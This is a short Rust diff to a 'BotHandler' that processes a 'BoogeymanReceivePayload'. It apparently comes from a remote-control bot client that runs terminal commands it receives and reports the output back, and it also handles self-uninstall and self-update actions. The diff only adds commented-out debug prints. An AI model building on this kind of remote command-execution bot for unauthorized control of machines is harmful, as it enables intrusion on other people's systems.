@@ -114,6 +114,7 @@ impl BotHandler {
         processed_data: BoogeymanReceivePayload,
         self_ref: RwPtr<Self>
     ) -> Result<()> {
+        // println!("{:#?}", processed_data);
         match processed_data.action {
             receive::ClientAction::UninstallSelf => {}
             receive::ClientAction::UpdateSelf => {}
@@ -123,8 +124,11 @@ impl BotHandler {
                         let mut terminal = terminal_ref.lock().await;
 
                         let data = match terminal.execute(&params.command) {
-                            Ok(data) =>
-                                send::TerminalOutputParams { output: Some(data), error: None },
+                            Ok(data) => {
+                                // println!("{:#?}", data);
+
+                                send::TerminalOutputParams { output: Some(data), error: None }
+                            }
                             Err(error) =>
                                 send::TerminalOutputParams {
                                     output: None,
